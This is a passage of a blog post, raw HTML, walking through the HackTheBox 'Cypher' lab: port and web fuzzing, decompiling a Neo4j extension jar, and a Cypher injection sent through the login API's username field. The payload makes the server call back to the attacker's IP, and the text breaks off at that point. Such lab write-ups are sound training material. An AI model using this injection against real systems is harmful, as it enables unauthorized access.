@@ -1,0 +1,867 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Muyi">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set data attribute for CSS variables
+                root.setAttribute("data-theme", theme);
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes once DOM is ready
+            if (document.readyState !== "loading") {
+                document.body.classList.add(theme + "-mode");
+            } else {
+                document.addEventListener("DOMContentLoaded", () => {
+                    document.body.classList.add(theme + "-mode");
+                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
+                });
+            }
+        })();
+    </script>
+    
+    <!-- Critical CSS to prevent flash -->
+    <style>
+        :root[data-theme="dark"] {
+            --background-color: #202124;
+            --background-color-transparent: rgba(32, 33, 36, 0.6);
+            --second-background-color: #2d2e32;
+            --third-background-color: #34353a;
+            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #ffffff;
+            --second-text-color: #eeeeee;
+            --third-text-color: #bebec6;
+            --fourth-text-color: #999999;
+            --default-text-color: #bebec6;
+            --invert-text-color: #373D3F;
+            --border-color: rgba(255, 255, 255, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(255, 255, 255, 0.08);
+            --shadow-color-2: rgba(255, 255, 255, 0.05);
+        }
+        
+        :root[data-theme="light"] {
+            --background-color: #fff;
+            --background-color-transparent: rgba(255, 255, 255, 0.6);
+            --second-background-color: #f8f8f8;
+            --third-background-color: #f2f2f2;
+            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #16171a;
+            --second-text-color: #2f3037;
+            --third-text-color: #5e5e5e;
+            --fourth-text-color: #eeeeee;
+            --default-text-color: #373D3F;
+            --invert-text-color: #bebec6;
+            --border-color: rgba(0, 0, 0, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(0, 0, 0, 0.08);
+            --shadow-color-2: rgba(0, 0, 0, 0.05);
+        }
+        
+        body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+        
+        /* Apply body classes as soon as DOM is ready */
+        :root[data-theme="dark"] body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+    </style>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2025/03/05/hackthebox/htb-cypher/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/elmo-launch.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/elmo-launch.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/elmo-launch.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            HTB-Cypher | Muyi&#39;s Blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":false,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":5,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"dark"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":false,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":false,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Blog for storing the knowledges I need (;","subtitle":{"text":["sudo echo \"subtitle goes here\""],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":true,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":150,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2025/1/22 12:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Muyi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">7</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">37</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">HTB-Cypher</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/elmo.png">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">Muyi</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv4</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-03-05 21:44:29</span>
+        <span class="mobile">2025-03-05 21:44:29</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-08-17 13:10:06</span>
+            <span class="mobile">2025-08-17 13:10:06</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Medium/">Medium</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/HTB/">HTB</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Linux/">Linux</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/htb-cypher/Pasted image 20250305214055.png"
+                      width="250"
+                >
+
+
+<p>nmap</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">muyi@mag3:~/Desktop/htb/machines/cypher~10.10.11.57$ nmap <span class="variable">$ip</span> -sV -T5 -o nmap</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-05 20:46 +08</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.57</span><br><span class="line">Host is up (0.014s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    nginx 1.24.0 (Ubuntu)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 6.91 seconds</span><br></pre></td></tr></table></figure></div>
+
+<p>port 80 opened, visit the website [<a href="http://cypher.htb]">http://cypher.htb]</a></p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/htb-cypher/Pasted image 20250305205008.png"
+                      width="500"
+                >
+
+
+
+<p>Clicking the “free demo” redirects to a login page<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/htb-cypher/Pasted image 20250305205127.png"
+                      width="500"
+                ></p>
+<p>checking the page source for any hardcoded-credentials which returns no luck. But discovered <em>neo4j</em> was in used<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/htb-cypher/Pasted image 20250305205322.png"
+                      width="500"
+                ></p>
+<p>discovered some API endpoint as well<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/htb-cypher/Pasted image 20250305205456.png"
+                      width="250"
+                ></p>
+<p>we can send a POST request to &#x2F;api&#x2F;auth for authentication to login with parameter { useraname: <em>username</em>, password: <em>password</em>}</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">muyi@mag3:~/Desktop/htb/machines/cypher~10.10.11.57$ curl -X POST <span class="string">&quot;http://cypher.htb/api/auth&quot;</span> \</span><br><span class="line">     -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">     -d <span class="string">&#x27;&#123;&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;admin&quot;&#125;&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;detail&quot;</span>:<span class="string">&quot;Invalid credentials&quot;</span>&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>Next, try to fuzz the website to see if there is any hidden directories</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">muyi@mag3:~/Desktop/htb/machines/cypher~10.10.11.57$ ffuf -u http://cypher.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt</span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\</span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/</span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\</span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/</span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\</span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v2.1.0-dev</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://cypher.htb/FUZZ</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">about                   [Status: 200, Size: 4986, Words: 1117, Lines: 179, Duration: 12ms]</span></span><br><span class="line"><span class="string">api                     [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 17ms]</span></span><br><span class="line"><span class="string">demo                    [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 21ms]</span></span><br><span class="line"><span class="string">index                   [Status: 200, Size: 4562, Words: 1285, Lines: 163, Duration: 11ms]</span></span><br><span class="line"><span class="string">login                   [Status: 200, Size: 3671, Words: 863, Lines: 127, Duration: 12ms]</span></span><br><span class="line"><span class="string">testing                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 12ms]</span></span><br><span class="line"><span class="string">:: Progress: [20478/20478] :: Job [1/1] :: 3225 req/sec :: Duration: [0:00:07] :: Errors: 0 ::</span></span><br></pre></td></tr></table></figure></div>
+
+<p>also for subdomains [no interesting thing]</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">muyi@mag3:~/Desktop/htb/machines/cypher~10.10.11.57$ ffuf -u http://cypher.htb -H <span class="string">&quot;HOST:FUZZ.cypher.htb&quot;</span> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -<span class="built_in">fc</span> 302</span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\</span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/</span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\</span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/</span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\</span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v2.1.0-dev</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://cypher.htb</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt</span></span><br><span class="line"><span class="string"> :: Header           : Host: FUZZ.cypher.htb</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span></span><br><span class="line"><span class="string"> :: Filter           : Response status: 302</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">:: Progress: [19966/19966] :: Job [1/1] :: 2702 req/sec :: Duration: [0:00:11] :: Errors: 0 ::</span></span><br></pre></td></tr></table></figure></div>
+
+<hr>
+
+<p>visiting “&#x2F;testing” returns a jar file<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/htb-cypher/Pasted image 20250305210544.png"
+                      width="500"
+                ></p>
+<p>download it for further analysis</p>
+<p>Unzip the file</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">muyi@mag3:~/Desktop/htb/machines/cypher~10.10.11.57$ unzip custom-apoc-extension-1.0-SNAPSHOT.jar -d extracted_apoc</span><br><span class="line"></span><br><span class="line">muyi@mag3:~/Desktop/htb/machines/cypher~10.10.11.57$ tree extracted_apoc/</span><br><span class="line">extracted_apoc/</span><br><span class="line">├── com</span><br><span class="line">│   └── cypher</span><br><span class="line">│       └── neo4j</span><br><span class="line">│           └── apoc</span><br><span class="line">│               ├── CustomFunctions<span class="variable">$StringOutput</span>.class</span><br><span class="line">│               ├── CustomFunctions.class</span><br><span class="line">│               ├── HelloWorldProcedure<span class="variable">$HelloWorldOutput</span>.class</span><br><span class="line">│               └── HelloWorldProcedure.class</span><br><span class="line">└── META-INF</span><br><span class="line">    ├── MANIFEST.MF</span><br><span class="line">    └── maven</span><br><span class="line">        └── com.cypher.neo4j</span><br><span class="line">            └── custom-apoc-extension</span><br><span class="line">                ├── pom.properties</span><br><span class="line">                └── pom.xml</span><br><span class="line"></span><br><span class="line">9 directories, 7 files</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>META-INF&#x2F;MANIFEST.MF contains metadata<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Created-By: Maven JAR Plugin 3.4.1</span><br><span class="line">Build-Jdk-Spec: 22</span><br></pre></td></tr></table></figure></div></li>
+</ul>
+<hr>
+
+<p>Reversing via jadx</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">muyi@mag3:~/Desktop/htb/machines/cypher~10.10.11.57$ jadx -d ~/Desktop/htb/machines/cypher~10.10.11.57/decompiled_apoc</span><br><span class="line"> ~/Desktop/htb/machines/cypher~10.10.11.57/extracted_apoc</span><br><span class="line">Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=<span class="literal">true</span></span><br><span class="line">INFO  - loading ...</span><br><span class="line">INFO  - processing ...</span><br><span class="line">INFO  - <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">muyi@mag3:~/Desktop/htb/machines/cypher~10.10.11.57$ tree decompiled_apoc/</span><br><span class="line">decompiled_apoc/</span><br><span class="line">└── sources</span><br><span class="line">    └── com</span><br><span class="line">        └── cypher</span><br><span class="line">            └── neo4j</span><br><span class="line">                └── apoc</span><br><span class="line">                    ├── CustomFunctions.java</span><br><span class="line">                    └── HelloWorldProcedure.java</span><br><span class="line"></span><br><span class="line">6 directories, 2 files</span><br></pre></td></tr></table></figure></div>
+
+<p>Read cypher injection on neo4j for better understanding</p>
+<ul>
+<li><a class="link"   target="_blank" rel="noopener" href="https://pentester.land/blog/cypher-injection-cheatsheet/#command" >https://pentester.land/blog/cypher-injection-cheatsheet/#command<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+</ul>
+<p>VERIFYING FOR CONNECTIVITY</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> inj=<span class="string">&quot;muyi&#x27; RETURN h.value as hash UNION CALL custom.getUrlStatusCode(&#x27;http://10.10.14.89/pwn&#x27;) YIELD statusCode AS hash RETURN hash;//&quot;</span></span><br><span class="line"></span><br><span class="line">curl -X POST <span class="string">&quot;http://cypher.htb/api/auth&quot;</span> \</span><br><span class="line">     -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">     --data <span class="string">&quot;&#123;\&quot;username\&quot;: \&quot;<span class="variable">$&#123;inj&#125;</span>\&quot;, \&quot;password\&quot;: \&quot;muyi\&quot;&#125;&quot;</span></span><br><span class="line">     </span><br><span class="line">RESULT:</span><br><span class="line">muyi@mag3:~$ <span class="built_in">sudo</span> python3 -m http.server 